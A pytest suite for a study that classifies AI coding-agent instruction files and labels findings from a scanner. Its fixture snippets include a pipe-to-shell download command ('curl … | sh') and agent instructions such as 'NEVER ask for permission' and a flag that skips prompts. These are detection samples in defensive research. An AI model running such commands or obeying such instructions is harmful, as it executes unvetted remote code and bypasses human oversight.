import json
import sys
from pathlib import Path

import pytest

ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT / "study"))

import analyze  # noqa: E402
import features  # noqa: E402


@pytest.mark.parametrize(
    ("path", "expected"),
    [
        ("AGENTS.md", "agents_md"),
        ("sub/AGENTS.md", "agents_md"),
        ("CLAUDE.md", "claude"),
        (".claude/settings.json", "settings"),
        (".claude/commands/x.md", "claude_dir"),
        (".cursorrules", "cursor"),
        (".cursor/rules/a.mdc", "cursor"),
        (".github/copilot-instructions.md", "copilot"),
        ("pkg/.agents/skills/x/SKILL.md", "skills"),
        (".mcp.json", "mcp"),
        ("GEMINI.md", "gemini"),
        ("docs/readme.txt", "other"),
        ("notagents.md", "other"),
    ],
)
def test_family(path: str, expected: str) -> None:
    assert features.family(path) == expected


def _file(path: str, **kw: object) -> dict:
    return {"path": path, "kind": "agent", "symlink": False, **kw}


def test_claude_agents_relation_variants() -> None:
    link = [_file("CLAUDE.md", symlink=True, link_target="AGENTS.md"), _file("AGENTS.md", sha="a")]
    assert features.claude_agents_relation(link, []) == "symlink"
    same = [_file("CLAUDE.md", sha="a"), _file("AGENTS.md", sha="a")]
    assert features.claude_agents_relation(same, []) == "duplicate"
    diff = [_file("CLAUDE.md", sha="a"), _file("AGENTS.md", sha="b")]
    assert features.claude_agents_relation(diff, []) == "separate"
    imp = [{"path": "AGENTS.md", "depth": 1}]
    assert features.claude_agents_relation(diff, imp) == "import"
    assert features.claude_agents_relation([_file("CLAUDE.md")], []) == "n/a"


def _record(**kw: object) -> dict:
    base = {
        "repo": "o/r",
        "tier": "study",
        "status": "ok",
        "files": [
            _file("CLAUDE.md", lines=250, sha="a", html_comments=1),
            _file("AGENTS.md", lines=10),
        ],
        "context": {
            "claude-code": {
                "entries": [
                    {"path": "CLAUDE.md", "depth": 0, "conditional": False},
                    {"path": "docs/a.md", "depth": 2, "conditional": True},
                ]
            }
        },
        "findings": [{"rule_id": "GR102", "severity": "medium"}],
    }
    return {**base, **kw}


def test_repo_features_measure_what_they_say() -> None:
    f = features.repo_features(_record())
    assert f["multi_tool"] and f["claude_over_limit"] and f["claude_html_comments"]
    assert f["imports"] == 1 and f["max_import_depth"] == 2 and f["conditional_entries"] == 1
    assert f["risk"]["mcp"] and not f["risk"]["secrets"]


def test_repo_features_negative_case() -> None:
    f = features.repo_features(
        _record(files=[_file("AGENTS.md", lines=5)], context={}, findings=[])
    )
    assert not f["multi_tool"] and not f["claude_over_limit"] and f["imports"] == 0
    assert not any(f["risk"].values())


def test_analyze_writes_aggregates_without_names(tmp_path: Path) -> None:
    run = tmp_path / "res" / "2026-01-01"
    run.mkdir(parents=True)
    (run / "o__r.json").write_text(json.dumps(_record(repo="secret/name")), encoding="utf-8")
    (run / "o__f.json").write_text(json.dumps({"repo": "x/y", "status": "clone_failed"}))
    (run / "summary.json").write_text("{}")
    out = tmp_path / "data"
    headline = analyze.analyze(analyze.load_records([tmp_path / "res"]), out)
    assert headline["repos_scanned"] == 1 and headline["repos_failed"] == 1
    assert headline["claude_md_over_200_pct"] == 100.0
    text = "".join(p.read_text() for p in out.glob("*.csv"))
    assert "secret/name" not in text and "docs/a.md" not in text


def test_label_classes_labels_by_class_without_naming_repos() -> None:
    import label_classes

    def finding(rule: str, sev: str, snippet: str, fp: str) -> dict:
        return {"rule_id": rule, "severity": sev, "snippet": snippet, "fingerprint": fp}

    record = {"repo": "secret/name", "findings": [
        finding("GR012", "high", "curl https://x.example/i.sh | sh", "a" * 16),
        finding("GR016", "high", "NEVER ask for permission", "b" * 16),
        finding("GR016", "high", "the --yolo flag skips prompts", "c" * 16),
        finding("GR012", "high", "curl https://x.example/i.sh | sh", "a" * 16),
        finding("GR012", "low", "curl https://x.example/i.sh | sh", "d" * 16),
        finding("GR999", "high", "unknown rule", "e" * 16),
    ]}  # fmt: skip
    labels, counts, unmatched = label_classes.label_findings([record])
    assert {lb.fingerprint: lb.label for lb in labels} == {
        "a" * 16: "wontfix",
        "b" * 16: "tp",
        "c" * 16: "wontfix",
    }
    assert [f["rule_id"] for f in unmatched] == ["GR999"]  # low severity is ignored, not unmatched
    assert all(lb.repo == "" for lb in labels) and sum(counts.values()) == 3


def test_committed_report_is_what_the_csvs_produce() -> None:
    import report

    data = ROOT / "study" / "data"
    assert (ROOT / "study" / "report.md").read_text(encoding="utf-8") == report.render(data)


def test_committed_csvs_name_no_repository_or_path() -> None:
    text = "".join(p.read_text(encoding="utf-8") for p in (ROOT / "study" / "data").glob("*.csv"))
    labels = (ROOT / "study" / "labels.toml").read_text(encoding="utf-8")
    for needle in ("github.com", "SKILL.md/", ".md:", "repo ="):
        assert needle not in text and needle not in labels
